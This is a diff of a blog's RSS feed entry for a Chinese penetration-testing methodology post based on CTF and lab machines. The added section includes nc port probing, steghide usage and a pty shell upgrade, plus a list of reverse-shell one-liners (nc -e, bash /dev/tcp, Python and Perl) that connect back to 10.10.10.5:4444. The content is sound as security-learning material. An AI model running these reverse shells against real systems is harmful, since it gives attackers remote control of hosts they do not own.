@@ -1342,69 +1342,47 @@ Use &#34;--help [option]&#34; to view documentation for a given option
         
         <item>
             <title>渗透测试通用方法论</title>
-            <link>http://localhost:1313/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/</link>
+            <link>http://localhost:1313/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E8%AE%BA/</link>
             <pubDate>Sat, 27 Dec 2025 17:29:33 +0800</pubDate>
             
-            <guid>http://localhost:1313/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/</guid>
+            <guid>http://localhost:1313/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E8%AE%BA/</guid>
             <description>&lt;blockquote&gt;
-&lt;p&gt;本文章以笔者写过的 80 台靶机为样本做渗透测试方法论分析&lt;/p&gt;&lt;/blockquote&gt;
-&lt;blockquote&gt;
 &lt;p&gt;本文章持续更新中&lt;/p&gt;&lt;/blockquote&gt;
-&lt;h2 id=&#34;靶机分类&#34;&gt;靶机分类&lt;/h2&gt;
-&lt;h3 id=&#34;攻击链复杂度分层&#34;&gt;攻击链复杂度分层&lt;/h3&gt;
-&lt;h4 id=&#34;easy-类型&#34;&gt;Easy 类型&lt;/h4&gt;
-&lt;p&gt;这类靶机没有复杂的攻击链，一般进行 信息收集、单漏洞利用 就可以拿到一个初始的立足点，然后进行简单的提权操作即可获得 root 权限。&lt;/p&gt;
-&lt;h5 id=&#34;web-漏洞链路&#34;&gt;Web 漏洞链路&lt;/h5&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;信息收集 → 目录爆破 → Web漏洞（SQL注入/命令注入/文件上传 等）→ 获得初始立足点 → 本地提权（SUID/Sudo/Cron/内核漏洞 等）
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例如：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Hack The Box 靶机 Busqueda 访问 80 端口暴露出使用的为开源系统 Searchor 2.4.0，随后在网络上搜索相关的漏洞利用&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E7%A4%BA%E6%84%8F%E5%9B%BE.png&#34; alt=&#34;漏洞搜索示意图&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;AI%E9%A9%B1%E5%8A%A8%E6%90%9C%E7%B4%A2.png&#34; alt=&#34;AI驱动搜索&#34;&gt;&lt;/p&gt;
-&lt;p&gt;在 kali 本地监听获得初始立足点后进行手工枚举（sudo -l ; whoami ;ip a 等），随后根据具体的情况进行进一步提权&lt;/p&gt;
-&lt;h5 id=&#34;凭证泄露&#34;&gt;凭证泄露&lt;/h5&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;服务枚举（SMB/FTP/NFS）→ 匿名访问/弱密码 → 凭证发现 → SSH/WinRM登录 → 提权
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例如：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;VulnHub 的靶机 LazySysAdmin 开启了 smb 服务，通过连接共享文件夹获取 mysql  和 phpmyadmin 的账号密码，通过暴力破解密码，ssh 获得初始立足点，随后提权。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h5 id=&#34;已知-cve-利用&#34;&gt;已知 CVE 利用&lt;/h5&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;版本识别 → CVE查询 → POC利用 → 过的初始立足点 → 基础
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例如：&lt;/p&gt;</description>
+&lt;h2 id=&#34;遇见的情况以及方法论&#34;&gt;遇见的情况以及方法论&lt;/h2&gt;
+&lt;h3 id=&#34;开放的非常规端口&#34;&gt;开放的非常规端口&lt;/h3&gt;
+&lt;p&gt;遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
+└─$ nc -u 10.10.10.45 1440
+?
+
+Wrong Code!!
+We&amp;#39;ll notify Commander Tarkin of this offense
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用 echo 传输字符串并通过 nc 链接端口。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
+└─$ echo &amp;#34;DS-1@OBS&amp;#34; | nc -u 10.10.10.45 1440
+......
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;图片分析&#34;&gt;图片分析&lt;/h3&gt;
+&lt;p&gt;图片分析一般先查看隐写情况。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
+└─$ steghide extract -sf x.jpg
+Enter passphrase:
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解释一下这个命令，extract 为提取模式，提取图片中隐藏的内容，-sf 为 &amp;ndash;stegofile 的缩写，指定文件为 x.jpg。需要密码的话想到的、空密码、弱密码均值得尝试。&lt;/p&gt;
+&lt;h3 id=&#34;bash-逃逸&#34;&gt;Bash 逃逸&lt;/h3&gt;
+&lt;p&gt;在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 -c &amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;);&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;获得-shell-的一些-反弹-shell&#34;&gt;获得 shell 的一些 反弹 shell&lt;/h3&gt;
+&lt;h4 id=&#34;linux&#34;&gt;Linux&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nc -e /bin/bash 10.10.10.5 4444
+
+bash -c &amp;#34;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.5/4444 0&amp;gt;&amp;amp;1&amp;#34;
+
+python3 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.10.5&amp;#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/bash&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;
+
+perl -e &amp;#39;use Socket;$i=&amp;#34;10.10.10.5&amp;#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;文件属性和可识别字符&#34;&gt;文件属性和可识别字符&lt;/h3&gt;
+&lt;p&gt;在拿到一个文件后可进行如下分析：&lt;/p&gt;</description>
             <content type="html"><![CDATA[<blockquote>
-<p>本文章以笔者写过的 80 台靶机为样本做渗透测试方法论分析</p></blockquote>
-<blockquote>
 <p>本文章持续更新中</p></blockquote>
-<h2 id="靶机分类">靶机分类</h2>
-<h3 id="攻击链复杂度分层">攻击链复杂度分层</h3>
-<h4 id="easy-类型">Easy 类型</h4>
-<p>这类靶机没有复杂的攻击链，一般进行 信息收集、单漏洞利用 就可以拿到一个初始的立足点，然后进行简单的提权操作即可获得 root 权限。</p>
-<h5 id="web-漏洞链路">Web 漏洞链路</h5>
-<pre tabindex="0"><code>信息收集 → 目录爆破 → Web漏洞（SQL注入/命令注入/文件上传 等）→ 获得初始立足点 → 本地提权（SUID/Sudo/Cron/内核漏洞 等）
-</code></pre><p>例如：</p>
-<ul>
-<li>Hack The Box 靶机 Busqueda 访问 80 端口暴露出使用的为开源系统 Searchor 2.4.0，随后在网络上搜索相关的漏洞利用</li>
-</ul>
-<p><img src="%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="漏洞搜索示意图"></p>
-<p><img src="AI%E9%A9%B1%E5%8A%A8%E6%90%9C%E7%B4%A2.png" alt="AI驱动搜索"></p>
-<p>在 kali 本地监听获得初始立足点后进行手工枚举（sudo -l ; whoami ;ip a 等），随后根据具体的情况进行进一步提权</p>
-<h5 id="凭证泄露">凭证泄露</h5>
-<pre tabindex="0"><code>服务枚举（SMB/FTP/NFS）→ 匿名访问/弱密码 → 凭证发现 → SSH/WinRM登录 → 提权
-</code></pre><p>例如：</p>
-<ul>
-<li>VulnHub 的靶机 LazySysAdmin 开启了 smb 服务，通过连接共享文件夹获取 mysql  和 phpmyadmin 的账号密码，通过暴力破解密码，ssh 获得初始立足点，随后提权。</li>
-</ul>
-<h5 id="已知-cve-利用">已知 CVE 利用</h5>
-<pre tabindex="0"><code>版本识别 → CVE查询 → POC利用 → 过的初始立足点 → 基础
-</code></pre><p>例如：</p>
-<ul>
-<li>Hack The Box 的靶机  Broker，通过利用 ActiveMQ 的 CVE payload 获得初始立足点</li>
-</ul>
-<h4 id="medium-类型">Medium 类型</h4>
-<p>这类靶机相对 Easy 类型靶机攻击难度略微复杂 。</p>
-<h4 id="hard-类型">Hard 类型</h4>
-<p>这类靶机通常需要多个攻击链利用，渗透难度较大。</p>
 <h2 id="遇见的情况以及方法论">遇见的情况以及方法论</h2>
 <h3 id="开放的非常规端口">开放的非常规端口</h3>
 <p>遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。</p>
